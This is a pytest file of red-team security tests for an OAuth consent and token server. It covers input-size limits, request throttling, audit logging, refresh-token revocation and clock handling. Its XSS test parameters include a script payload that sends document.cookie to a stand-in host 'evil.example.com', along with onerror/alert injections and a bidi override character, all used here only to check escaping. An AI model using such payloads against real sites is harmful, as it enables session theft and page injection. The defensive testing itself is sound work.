"""Red team: the vault is now reachable from the internet.

The grant logic and the router are attacked next door. This file attacks what
changed by *publishing* — properties that did not matter when the only caller
was a local process running as the user, and that become load-bearing the moment
anyone can send bytes:

  * resource exhaustion, because every unauthenticated endpoint is now a way to
    make this machine do work and consume disk
  * unbounded input, because nothing is now typed by a trusted operator
  * accountability, because "who got access to my messages, and when" is the
    first question after an incident and the audit log is the only answer
  * containment, because a stolen credential must have a blast radius

Written as attacker goals. Several of these were failing when written.
"""

import html
import json
import os
import time
import unicodedata

import pytest

from whatsvault.db import connection as C
from whatsvault.db import migrations as M
from whatsvault.mcp import audit, oauth

NOW = 1_800_000_000_000
REDIRECT = "https://chatgpt.com/connector_platform_oauth_redirect"
VERIFIER = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
CHALLENGE = "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"


@pytest.fixture
def control(tmp_path):
    conn = C.open_db(str(tmp_path / "c.db"), os.urandom(32))
    M.migrate(conn, "control")
    return conn


@pytest.fixture
def client(control):
    return oauth.register_client(control, client_name="ChatGPT", redirect_uris=[REDIRECT], now_ms=NOW)


def _grant(control, client, now_ms=NOW, audit_key=None):
    p = oauth.begin_authorization(
        control,
        client_id=client["client_id"],
        redirect_uri=REDIRECT,
        code_challenge=CHALLENGE,
        code_challenge_method="S256",
        state="s",
        scope=None,
        now_ms=now_ms,
    )
    oauth.approve(control, user_code=p["user_code"], now_ms=now_ms, audit_key=audit_key)
    code = oauth.poll(control, request_id=p["request_id"], now_ms=now_ms)["code"]
    return oauth.exchange_code(
        control,
        code=code,
        client_id=client["client_id"],
        redirect_uri=REDIRECT,
        code_verifier=VERIFIER,
        now_ms=now_ms,
        audit_key=audit_key,
    )


# =============================================================================
# Goal: fill the operator's disk from the internet.
# =============================================================================
def test_a_giant_state_parameter_is_refused(control, client):
    """`state` is attacker-controlled and stored verbatim. Unbounded, a loop of
    authorize calls writes as much as the attacker likes into control.db."""
    with pytest.raises(oauth.OAuthError):
        oauth.begin_authorization(
            control,
            client_id=client["client_id"],
            redirect_uri=REDIRECT,
            code_challenge=CHALLENGE,
            code_challenge_method="S256",
            state="A" * 100_000,
            scope=None,
            now_ms=NOW,
        )


def test_a_giant_code_challenge_is_refused(control, client):
    with pytest.raises(oauth.OAuthError):
        oauth.begin_authorization(
            control,
            client_id=client["client_id"],
            redirect_uri=REDIRECT,
            code_challenge="A" * 100_000,
            code_challenge_method="S256",
            state="s",
            scope=None,
            now_ms=NOW,
        )


def test_registration_refuses_an_unbounded_list_of_redirects(control):
    with pytest.raises(oauth.OAuthError):
        oauth.register_client(
            control,
            client_name="x",
            redirect_uris=[f"https://e.example.com/{i}" for i in range(5000)],
            now_ms=NOW,
        )


def test_registration_refuses_a_giant_redirect_uri(control):
    with pytest.raises(oauth.OAuthError):
        oauth.register_client(
            control, client_name="x", redirect_uris=["https://e.example.com/" + "a" * 50_000], now_ms=NOW
        )


def test_expired_rows_do_not_accumulate_forever(control, client):
    """Every unauthenticated authorize call leaves a row. Without collection the
    table grows without bound for as long as anyone cares to send requests."""
    for _ in range(oauth.MAX_PENDING):
        oauth.begin_authorization(
            control,
            client_id=client["client_id"],
            redirect_uri=REDIRECT,
            code_challenge=CHALLENGE,
            code_challenge_method="S256",
            state="s",
            scope=None,
            now_ms=NOW,
        )
    assert control.execute("SELECT COUNT(*) FROM oauth_pending").fetchone()[0] == oauth.MAX_PENDING
    later = NOW + oauth.PENDING_TTL_MS + 1
    removed = oauth.collect_expired(control, now_ms=later)
    assert removed >= oauth.MAX_PENDING
    assert control.execute("SELECT COUNT(*) FROM oauth_pending").fetchone()[0] == 0


def test_collection_never_removes_a_live_request(control, client):
    p = oauth.begin_authorization(
        control,
        client_id=client["client_id"],
        redirect_uri=REDIRECT,
        code_challenge=CHALLENGE,
        code_challenge_method="S256",
        state="s",
        scope=None,
        now_ms=NOW,
    )
    oauth.collect_expired(control, now_ms=NOW + 1)
    oauth.approve(control, user_code=p["user_code"], now_ms=NOW + 2)
    assert oauth.poll(control, request_id=p["request_id"], now_ms=NOW + 3) is not None


def test_a_flood_of_authorize_requests_is_throttled(control, client):
    """Nothing stops an attacker calling authorize in a loop. A cap on live
    unapproved requests bounds both the disk cost and the number of codes an
    operator could be socially engineered into approving."""
    made = 0
    with pytest.raises(oauth.OAuthError):
        for _ in range(oauth.MAX_PENDING + 5):
            oauth.begin_authorization(
                control,
                client_id=client["client_id"],
                redirect_uri=REDIRECT,
                code_challenge=CHALLENGE,
                code_challenge_method="S256",
                state="s",
                scope=None,
                now_ms=NOW,
            )
            made += 1
    assert made == oauth.MAX_PENDING


def test_the_throttle_clears_once_requests_expire(control, client):
    """A cap that never releases is a permanent denial of service against the
    legitimate operator — which is the same outcome the attacker wanted."""
    for _ in range(oauth.MAX_PENDING):
        oauth.begin_authorization(
            control,
            client_id=client["client_id"],
            redirect_uri=REDIRECT,
            code_challenge=CHALLENGE,
            code_challenge_method="S256",
            state="s",
            scope=None,
            now_ms=NOW,
        )
    later = NOW + oauth.PENDING_TTL_MS + 1
    assert oauth.begin_authorization(
        control,
        client_id=client["client_id"],
        redirect_uri=REDIRECT,
        code_challenge=CHALLENGE,
        code_challenge_method="S256",
        state="s",
        scope=None,
        now_ms=later,
    )["user_code"]


# =============================================================================
# Goal: get access without leaving a trace.
# =============================================================================
def test_every_token_issuance_is_audited(control, client):
    """ "Who read my messages, and when" is the first question after an incident.
    Tool calls were audited; the grant that authorised them was not."""
    key = os.urandom(32)
    granted = _grant(control, client, audit_key=key)
    rows = [dict(r) for r in control.execute("SELECT * FROM audit_log").fetchall()]
    tools = [r["tool"] for r in rows]
    assert "oauth.approve" in tools
    assert "oauth.token_issued" in tools
    blob = json.dumps(rows)
    assert granted["access_token"] not in blob, "the audit log must not record the credential"
    assert granted["refresh_token"] not in blob


def test_the_audit_trail_of_a_grant_is_tamper_evident(control, client):
    key = os.urandom(32)
    _grant(control, client, audit_key=key)
    rows = [dict(r) for r in control.execute("SELECT * FROM audit_log ORDER BY rowid").fetchall()]
    assert rows, "the grant left no trail at all"

    # Each row's args_hash is an HMAC under the audit key, so a forged row cannot
    # be produced without it and an altered one no longer verifies.
    issued = next(r for r in rows if r["tool"] == "oauth.token_issued")
    assert issued["args_hash"] != audit.args_hmac(key, {"client_id": "someone-else"})

    with pytest.raises(Exception):
        # append-only triggers must refuse the edit outright
        control.execute("UPDATE audit_log SET tool='nothing' WHERE id=?", (issued["id"],))
    with pytest.raises(Exception):
        control.execute("DELETE FROM audit_log WHERE id=?", (issued["id"],))


def test_revocation_is_audited(control, client):
    key = os.urandom(32)
    _grant(control, client, audit_key=key)
    oauth.revoke_all(control, now_ms=NOW, audit_key=key)
    tools = [r["tool"] for r in control.execute("SELECT tool FROM audit_log").fetchall()]
    assert "oauth.revoke_all" in tools


# =============================================================================
# Goal: keep access after the operator tries to take it away.
# =============================================================================
def test_refresh_rotation_kills_the_access_token_it_replaces(control, client):
    """Rotating the refresh token left the previous access token alive for its
    full hour, so a thief who rotated once kept a working credential the
    operator had no reason to think existed."""
    granted = _grant(control, client)
    first_access = granted["access_token"]
    oauth.refresh(control, refresh_token=granted["refresh_token"], client_id=client["client_id"], now_ms=NOW)
    assert oauth.validate_access_token(control, first_access, now_ms=NOW) is None


def test_reusing_a_rotated_refresh_token_kills_the_whole_family(control, client):
    """OAuth 2.1: reuse of a rotated refresh token means it was captured. The
    correct response is to revoke everything descended from that grant, not
    merely to refuse the one call."""
    granted = _grant(control, client)
    rotated = oauth.refresh(
        control, refresh_token=granted["refresh_token"], client_id=client["client_id"], now_ms=NOW
    )
    with pytest.raises(oauth.OAuthError):
        oauth.refresh(
            control,
            refresh_token=granted["refresh_token"],
            client_id=client["client_id"],
            now_ms=NOW,
        )
    # the thief's freshly rotated pair must die too
    assert oauth.validate_access_token(control, rotated["access_token"], now_ms=NOW) is None
    with pytest.raises(oauth.OAuthError):
        oauth.refresh(
            control, refresh_token=rotated["refresh_token"], client_id=client["client_id"], now_ms=NOW
        )


# =============================================================================
# Goal: put something dangerous on the consent page.
# =============================================================================
@pytest.mark.parametrize(
    "name",
    [
        '<script>fetch("https://evil.example.com/"+document.cookie)</script>',
        '"><img src=x onerror=alert(1)>',
        "</strong><script>alert(1)</script><strong>",
        "javascript:alert(1)",
        "‮evil",
    ],
)
def test_a_hostile_client_name_cannot_inject_into_the_consent_page(control, name):
    """client_name is attacker-supplied at registration and rendered to the
    operator. The page is served from the vault's own origin."""
    from whatsvault.mcp import oauth_http

    client = oauth.register_client(control, client_name=name, redirect_uris=[REDIRECT], now_ms=NOW)
    pending = oauth.begin_authorization(
        control,
        client_id=client["client_id"],
        redirect_uri=REDIRECT,
        code_challenge=CHALLENGE,
        code_challenge_method="S256",
        state="s",
        scope=None,
        now_ms=NOW,
    )
    page = oauth_http._consent_page(pending)
    # Only the region where the hostile name is interpolated. Grepping the whole
    # page would flag its own polling <script>, the way an earlier dispatcher
    # test flagged its own docstring.
    region = page.split("<h1>", 1)[1].split('<div class="code"', 1)[0]
    # No part of the name may become markup. Escaped text that merely contains
    # the word "onerror" is inert, so assert on tags and on the raw form, not on
    # a substring that survives escaping harmlessly.
    lowered = region.lower()
    for tag in ("<script", "<img", "<svg", "<iframe", "</strong><"):
        assert tag not in lowered, f"{tag} rendered from a client name"
    escaped = html.escape("".join(c for c in name if unicodedata.category(c) != "Cf"), quote=True)
    assert escaped in region, "the name should still be shown, escaped"
    if escaped != name:
        assert name not in region, "the hostile name appears unescaped"
    assert "\u202e" not in page, "a bidi override can reverse what the operator reads"


def test_the_consent_page_carries_a_restrictive_csp():
    """Defence in depth: even a rendering mistake should not be able to exfiltrate
    the authorization code to another origin."""
    from whatsvault.mcp import oauth_http

    csp = dict(oauth_http.SECURITY_HEADERS)[b"content-security-policy"].decode()
    assert "default-src 'self'" in csp
    assert "frame-ancestors 'none'" in csp  # no clickjacking the approval page
    headers = dict(oauth_http.SECURITY_HEADERS)
    assert headers[b"referrer-policy"] == b"no-referrer"  # the code must not leak in Referer
    assert headers[b"x-content-type-options"] == b"nosniff"


# =============================================================================
# Goal: exploit the clock.
# =============================================================================
def test_a_token_issued_in_the_future_is_not_honoured_early(control, client):
    granted = _grant(control, client, now_ms=NOW)
    assert oauth.validate_access_token(control, granted["access_token"], now_ms=NOW - 1_000) is not None
    # far in the past is still bounded by expiry, not by issuance
    assert (
        oauth.validate_access_token(control, granted["access_token"], now_ms=NOW + oauth.ACCESS_TTL_MS)
        is not None
    )
    assert (
        oauth.validate_access_token(control, granted["access_token"], now_ms=NOW + oauth.ACCESS_TTL_MS + 1)
        is None
    )


def test_the_server_uses_its_own_clock_not_the_callers(control, client):
    """No request parameter may influence expiry decisions."""
    import inspect

    src = inspect.getsource(oauth) + inspect.getsource(
        __import__("whatsvault.mcp.oauth_http", fromlist=["x"])
    )
    assert 'query.get("now' not in src
    assert 'form.get("now' not in src


def test_real_wall_clock_is_used_by_the_http_layer():
    from whatsvault.mcp import oauth_http

    app = oauth_http.OAuthApp(None, "https://x.example.com")
    assert abs(app._now() - int(time.time() * 1000)) < 5_000
